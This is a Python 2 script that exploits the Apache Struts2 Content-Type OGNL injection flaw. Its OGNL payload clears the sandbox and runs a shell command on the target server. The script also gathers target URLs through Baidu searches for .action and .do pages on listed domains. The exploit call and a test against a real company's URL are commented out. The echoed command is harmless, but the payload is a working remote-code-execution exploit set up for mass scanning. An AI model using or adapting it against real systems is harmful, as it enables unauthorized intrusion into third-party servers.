#! -*- coding:utf-8 -*-

__author__="nMask"
__Blog__="http://thief.one"
__Date__="20170307"


import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from getbaidulink import getbaidulink
from anbaidulink import anbaidulink



def poc(url):
	register_openers()
	datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
	header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
	header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	try:
	    request = urllib2.Request(url,datagen,headers=header)
	    response = urllib2.urlopen(request)
	    body=response.read()
	except Exception,e:
		print e
		body=""

	return body


if __name__=="__main__":
	keyword_list=["site:"+i.strip("\n")+" inurl:'.action'" for i in open("url.txt","r").readlines()]+["site:"+i.strip("\n")+" inurl:'.do'" for i in open("url.txt","r").readlines()]

	cur=getbaidulink()
	cur_2=anbaidulink()
	# f=open("result.txt","a")
	f2=open("result_all.txt","a")
	for keyword in keyword_list:
		for i in range(1):
			list_url=cur.run(keyword=keyword,page=0,one_proxy="")
			for url in list_url:
				url=cur_2.run(url)
				print url
				f2.write(url+"\n")
				# body=poc(url)
				# if "nMask" in body:
				# 	print "[Loopholes exist]",url
				# 	f.write(url+"\n")
	# f.close()
	f2.close()

	# body=poc("http://job.10086.cn/company/anouncement/showAnouncement.action")
	# if "nMask" in body:
	# 	print "s"

